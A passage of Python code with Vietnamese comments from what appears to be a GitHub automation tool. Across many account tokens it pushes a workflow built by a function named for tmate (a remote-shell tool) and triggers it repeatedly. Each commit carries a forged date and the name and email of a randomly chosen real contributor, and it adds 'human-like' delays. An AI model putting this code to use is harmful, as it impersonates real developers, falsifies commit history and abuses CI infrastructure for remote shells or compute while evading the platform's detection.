            if f"origin/{default_branch}" in remote_branches:
                # Checkout nhánh mặc định từ remote nếu tồn tại
                subprocess.run(["git", "checkout", "-b", default_branch, f"origin/{default_branch}"], check=True)
            else:
                # Kiểm tra sự tồn tại của nhánh local trước khi tạo
                result_local = subprocess.run(["git", "branch"], capture_output=True, text=True, check=True)
                local_branches = result_local.stdout.splitlines()
                local_branch_names = [branch.replace('*', '').strip() for branch in local_branches]

                if default_branch in local_branch_names:
                    # Chuyển sang nhánh nếu đã tồn tại
                    subprocess.run(["git", "checkout", default_branch], check=True)
                else:
                    # Tạo nhánh mới từ HEAD nếu chưa tồn tại
                    subprocess.run(["git", "checkout", "-b", default_branch], check=True)

            # Thêm file workflow custom vào repository
            workflow_dir = os.path.join('.github', 'workflows')
            os.makedirs(workflow_dir, exist_ok=True)
            workflow_path = os.path.join(workflow_dir, 'python.yml')
            with open(workflow_path, 'w', encoding='utf-8') as f:
                f.write(self.get_tmate_workflow_content())

            # Lấy ngày tạo của repository random và thêm 5 ngày
            repo_api_url = f"https://api.github.com/repos/{repo}"
            repo_info = requests.get(repo_api_url, headers=headers).json()
            created_at = repo_info.get("created_at")
            if created_at:
                from dateutil import parser
                import calendar
                dt = parser.isoparse(created_at) + timedelta(days=5)
                fake_date = dt.strftime("%Y-%m-%dT%H:%M:%S")
            else:
                fake_date = "2023-01-01T12:00:00"  # Fallback nếu không lấy được ngày tạo

            # Lấy thông tin contributor của repo
            contributors_api_url = f"https://api.github.com/repos/{repo}/contributors"
            contributors_info = requests.get(contributors_api_url, headers=headers).json()
            contributor = None
            if isinstance(contributors_info, list) and contributors_info:
                # Chọn contributor ngẫu nhiên (không phải bản thân mình)
                contributors_filtered = [c for c in contributors_info if c.get("login") != username]
                if contributors_filtered:
                    contributor = random.choice(contributors_filtered)
                else:
                    contributor = contributors_info[0]
            if contributor:
                author_name = contributor.get("login", "contributor")
                author_email = contributor.get("email") or f"{contributor.get('id', '00000000')}+{author_name}@users.noreply.github.com"
            else:
                author_name = username
                author_email = f"{username}@users.noreply.github.com"

            # Thêm và commit file workflow với ngày giả mạo và thông tin author
            env = os.environ.copy()
            env['GIT_COMMITTER_DATE'] = fake_date
            env['GIT_AUTHOR_DATE'] = fake_date
            env['GIT_AUTHOR_NAME'] = author_name
            env['GIT_AUTHOR_EMAIL'] = author_email
            env['GIT_COMMITTER_NAME'] = author_name
            env['GIT_COMMITTER_EMAIL'] = author_email

            subprocess.run(["git", "add", workflow_path], check=True)
            subprocess.run(["git", "commit", "-m", "Add workflow"], check=True, env=env)

            # Push code lên repository mới tạo
            try:
                subprocess.run(["git", "push", "-u", "origin", default_branch], check=True)
                print(f"Successfully pushed to https://github.com/{username}/{repo_name}.git")
            except subprocess.CalledProcessError:
                print(f"Failed to push to repository: {repo_name}. Skipping...")
                os.chdir("..")
                continue

            # Chạy action custom_workflow.yml 8 lần, dispatch event 'train-ai', delay 2-3 giây mỗi lần
            for i in range(8):
                print(f"Triggering workflow python.yml for {repo_name} - lần {i+1}/8 (event: train-ai)")
                self.trigger_workflow(token, username, repo_name, workflow_file="python.yml", event_type="train-ai")
                self.human_like_delay(2.0, 3.0)

            # Quay lại thư mục gốc
            os.chdir("..")

        print("Completed cloning, creating, modifying, and pushing repositories.")
        self.human_like_delay(3.0, 5.0)

if __name__ == "__main__":
    manager = GitHubVPSManager()
    manager.run()
    # Thực thi clone và sửa repo với tất cả token hợp lệ
    for token in manager.tokens:

        manager.clone_and_modify_repos(token)
